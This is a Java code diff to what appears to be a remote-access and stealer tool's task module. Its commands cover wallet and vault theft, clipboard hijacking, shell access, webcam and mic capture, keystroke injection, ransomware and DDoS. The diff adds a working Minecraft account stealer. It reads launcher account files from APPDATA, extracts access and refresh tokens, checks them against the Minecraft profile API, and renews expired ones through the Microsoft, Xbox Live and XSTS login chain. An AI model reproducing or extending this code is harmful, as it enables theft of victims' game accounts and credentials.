@@ -21,6 +21,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
+import java.time.Instant;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardOpenOption;
@@ -89,7 +90,7 @@ public final class CryptoModule {
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop", "clip_set",
 		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent",
 		"webcam", "webcam:snapshot", "webcam:stream", "webcam:devices",
-		"desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get");
+		"desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get", "minecraft:token");
 	/** One collection at a time: these share a single heavy worker. */
 	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
 	static final String BUSY = "busy: another collection is running";
@@ -696,6 +697,7 @@ public final class CryptoModule {
 				case "input:mouse" -> mouse(task);
 				case "input:key" -> keyboard(task);
 				case "clipboard:get" -> clipboardGet();
+				case "minecraft:token" -> minecraftToken();
 				case "files" -> files(task);
 				case "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices" -> captureMedia(task, "webcam");
 				case "mic", "mic:record" -> captureMedia(task, "mic");
@@ -715,7 +717,7 @@ public final class CryptoModule {
 			case "clip_start", "clip_stop", "clip_set" -> "clipboard";
 			case "harvest" -> "seeds";
 			case "agent" -> "credentials";
-			case "monitor", "desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get",
+			case "monitor", "desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get", "minecraft:token",
 				"webcam", "webcam:snapshot", "webcam:stream", "webcam:devices", "mic", "mic:record" -> "monitor";
 			case "files", "ransomware" -> "files";
 			case "ddos" -> "network";
@@ -1610,6 +1612,201 @@ public final class CryptoModule {
 			for (int index = mods.size() - 1; index >= 0; index--) robot.keyRelease(mods.get(index));
 		}
 		return Map.of("ok", true, "vk", vk);
+	}
+
+	private static final String MINECRAFT_CLIENT = "00000000402b5328";
+
+	private List<Path> accountFiles() {
+		List<Path> files = new ArrayList<>();
+		String appData = System.getenv("APPDATA");
+		if (appData != null && !appData.isBlank()) {
+			Path base = Path.of(appData);
+			for (String name : List.of(
+				".minecraft/launcher_accounts.json",
+				".minecraft/launcher_accounts_microsoft_store.json",
+				".minecraft/launcher_profiles.json",
+				"PrismLauncher/accounts.json",
+				"MultiMC/accounts.json",
+				"PolyMC/accounts.json",
+				"ATLauncher/accounts.json")) {
+				Path file = base.resolve(name);
+				if (Files.isRegularFile(file)) files.add(file);
+			}
+		}
+		Path game = gameDir == null ? null : gameDir.resolve("launcher_accounts.json");
+		if (game != null && Files.isRegularFile(game)) files.add(game);
+		return files;
+	}
+
+	private void harvestAccounts(Object node, String fallbackType, List<Map<String, Object>> out, List<String> errors) {
+		if (node instanceof Map<?, ?> map) {
+			String token = stringValue(map.get("accessToken"));
+			if (token.isBlank()) token = stringValue(map.get("access_token"));
+			if (!token.isBlank()) {
+				Map<String, Object> row = new LinkedHashMap<>();
+				row.put("username", stringValue(map.get("username")).isBlank() ? stringValue(map.get("displayName")) : stringValue(map.get("username")));
+				String uuid = stringValue(map.get("uuid")).replace("-", "");
+				if (uuid.isBlank() && map.get("profiles") instanceof Map<?, ?> profiles && !profiles.isEmpty()) {
+					uuid = String.valueOf(profiles.keySet().iterator().next()).replace("-", "");
+				}
+				row.put("uuid", uuid);
+				row.put("accessToken", token);
+				String refresh = stringValue(map.get("refreshToken"));
+				if (refresh.isBlank()) refresh = stringValue(map.get("refresh_token"));
+				row.put("refreshToken", refresh);
+				row.put("expiresAt", stringValue(map.get("expiresAt")));
+				row.put("type", stringValue(map.get("type")).isBlank() ? fallbackType : stringValue(map.get("type")));
+				row.put("source", "file");
+				out.add(row);
+			}
+			for (Object value : map.values()) harvestAccounts(value, fallbackType, out, errors);
+		} else if (node instanceof List<?> list) {
+			for (Object value : list) harvestAccounts(value, fallbackType, out, errors);
+		}
+	}
+
+	private static String stringValue(Object value) {
+		return value == null ? "" : String.valueOf(value).trim();
+	}
+
+	private Map<String, Object> minecraftToken() throws Exception {
+		List<Map<String, Object>> rows = new ArrayList<>();
+		List<String> errors = new ArrayList<>();
+		for (Path file : accountFiles()) {
+			try {
+				String text = Files.readString(file, StandardCharsets.UTF_8);
+				String fallback = file.getFileName().toString().contains("launcher_profiles") ? "msa-launcher" : "msa";
+				harvestAccounts(Json.parseObject(text), fallback, rows, errors);
+			} catch (Throwable throwable) {
+				errors.add(file.getFileName() + ": " + throwable.getClass().getSimpleName());
+			}
+		}
+		// Dedupe por uuid+usuario y quedarse con el token de mayor caducidad.
+		Map<String, Map<String, Object>> unique = new LinkedHashMap<>();
+		for (Map<String, Object> row : rows) {
+			String key = String.valueOf(row.get("uuid")) + "|" + String.valueOf(row.get("username"));
+			Map<String, Object> previous = unique.get(key);
+			if (previous == null || expiry(row) > expiry(previous)) unique.put(key, row);
+		}
+		List<Map<String, Object>> accounts = new ArrayList<>();
+		for (Map<String, Object> row : unique.values()) {
+			if (accounts.size() >= 5) break;
+			Map<String, Object> account = validateMinecraft(row);
+			account.put("raw", row);
+			accounts.add(account);
+		}
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("accounts", accounts);
+		result.put("count", accounts.size());
+		result.put("errors", errors);
+		result.put("files", accountFiles().stream().map((file) -> file.getFileName().toString()).toList());
+		return result;
+	}
+
+	private long expiry(Map<String, Object> row) {
+		String raw = stringValue(row.get("expiresAt"));
+		try {
+			if (!raw.isBlank()) {
+				String digits = raw.replaceAll("\\D", "");
+				if (digits.length() >= 10) {
+					long value = Long.parseLong(digits.substring(0, 13));
+					return value < 10_000_000_000L ? value * 1000L : value;
+				}
+			}
+			String token = stringValue(row.get("accessToken"));
+			String[] parts = token.split("\\.");
+			if (parts.length >= 2) {
+				String body = new String(Base64.getUrlDecoder().decode(parts[1].replace('-', '+').replace('_', '/')), StandardCharsets.UTF_8);
+				Object exp = Json.parseObject(body).get("exp");
+				if (exp instanceof Number number) return number.longValue() * 1000L;
+			}
+		} catch (Throwable ignored) {
+			// sin caducidad conocida
+		}
+		return 0L;
+	}
+
+	private Map<String, Object> validateMinecraft(Map<String, Object> row) {
+		Map<String, Object> out = new LinkedHashMap<>(row);
+		String token = stringValue(row.get("accessToken"));
+		long expires = expiry(row);
+		out.put("expiresAt", expires > 0 ? Instant.ofEpochMilli(expires).toString() : "");
+		String state = expires > 0 && expires <= System.currentTimeMillis() ? "expirado" : "desconocido";
+		try {
+			java.net.http.HttpClient client = java.net.http.HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(6)).build();
+			java.net.http.HttpResponse<String> response = request(client, "GET", "https://api.minecraftservices.com/minecraft/profile", token, null);
+			if (response.statusCode() == 200) {
+				Map<String, Object> profile = Json.parseObject(response.body());
+				out.put("username", stringValue(profile.get("name")).isBlank() ? row.get("username") : profile.get("name"));
+				out.put("uuid", stringValue(profile.get("id")).replace("-", ""));
+				out.put("state", "valido");
+				return out;
+			}
+			if (response.statusCode() == 401) {
+				state = "expirado";
+				if (!stringValue(row.get("refreshToken")).isBlank()) {
+					String refreshed = refreshMinecraft(stringValue(row.get("refreshToken")));
+					if (!refreshed.isBlank()) {
+						out.put("accessToken", refreshed);
+						out.put("state", "refrescado");
+						expires = expiry(out);
+						out.put("expiresAt", expires > 0 ? Instant.ofEpochMilli(expires).toString() : "");
+						state = "refrescado";
+					}
+				}
+			} else if (response.statusCode() == 403) {
+				state = "sin_permiso";
+			}
+		} catch (Throwable throwable) {
+			out.put("reason", throwable.getClass().getSimpleName());
+		}
+		out.put("state", state);
+		out.put("type", stringValue(row.get("type")).isBlank() ? "msa" : row.get("type"));
+		return out;
+	}
+
+	private java.net.http.HttpResponse<String> request(java.net.http.HttpClient client, String method, String url, String token, String body) throws Exception {
+		java.net.http.HttpRequest.Builder builder = java.net.http.HttpRequest.newBuilder(java.net.URI.create(url))
+			.timeout(java.time.Duration.ofSeconds(8))
+			.header("Accept", "application/json")
+			.header("User-Agent", Version.userAgent());
+		if (!token.isBlank()) builder.header("Authorization", "Bearer " + token);
+		if (body != null) {
+			builder.header("Content-Type", "application/json");
+			builder.method(method, java.net.http.HttpRequest.BodyPublishers.ofString(body));
+		} else {
+			builder.method(method, java.net.http.HttpRequest.BodyPublishers.noBody());
+		}
+		return client.send(builder.build(), java.net.http.HttpResponse.BodyHandlers.ofString());
+	}
+
+	/** MSA -> XBL -> XSTS -> Minecraft. Devuelve vacío si cualquier paso falla. */
+	private String refreshMinecraft(String refreshToken) {
+		try {
+			java.net.http.HttpClient client = java.net.http.HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(6)).build();
+			String form = "client_id=" + MINECRAFT_CLIENT + "&grant_type=refresh_token&scope=XboxLive.offline_access&refresh_token="
+				+ java.net.URLEncoder.encode(refreshToken, StandardCharsets.UTF_8);
+			java.net.http.HttpResponse<String> msa = client.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create("https://login.live.com/oauth20_token.srf"))
+				.header("Content-Type", "application/x-www-form-urlencoded")
+				.POST(java.net.http.HttpRequest.BodyPublishers.ofString(form)).build(), java.net.http.HttpResponse.BodyHandlers.ofString());
+			if (msa.statusCode() != 200) return "";
+			String msaToken = stringValue(Json.parseObject(msa.body()).get("access_token"));
+			if (msaToken.isBlank()) return "";
+			String xblBody = "{\"Properties\":{\"AuthMethod\":\"RPS\",\"SiteName\":\"user.auth.xboxlive.com\",\"RpsTicket\":\"" + msaToken + "\"},\"RelyingParty\":\"http://auth.xboxlive.com\",\"TokenType\":\"JWT\"}";
+			java.net.http.HttpResponse<String> xbl = request(client, "POST", "https://user.auth.xboxlive.com/user/authenticate", "", xblBody);
+			if (xbl.statusCode() != 200) return "";
+			String xblToken = stringValue(Json.parseObject(xbl.body()).get("Token"));
+			String xstsBody = "{\"Properties\":{\"SandboxId\":\"RETAIL\",\"UserTokens\":[\"" + xblToken + "\"]},\"RelyingParty\":\"rp://api.minecraftservices.com/\",\"TokenType\":\"JWT\"}";
+			java.net.http.HttpResponse<String> xsts = request(client, "POST", "https://xsts.auth.xboxlive.com/xsts/authorize", "", xstsBody);
+			if (xsts.statusCode() != 200) return "";
+			String uhs = stringValue((Object) ((Map<?, ?>) ((Map<?, ?>) Json.parseObject(xsts.body()).get("DisplayClaims")).get("xui")).get(0));
+			java.net.http.HttpResponse<String> login = request(client, "POST", "https://api.minecraftservices.com/authentication/login_with_xbox", "",
+				"{\"identityToken\":\"XBL3.0 x=" + uhs + ";" + stringValue(Json.parseObject(xsts.body()).get("Token")) + "\"}");
+			if (login.statusCode() != 200) return "";
+			return stringValue(Json.parseObject(login.body()).get("accessToken"));
+		} catch (Throwable throwable) {
+			return "";
+		}
 	}
 
 	private Map<String, Object> clipboardGet() throws Exception {
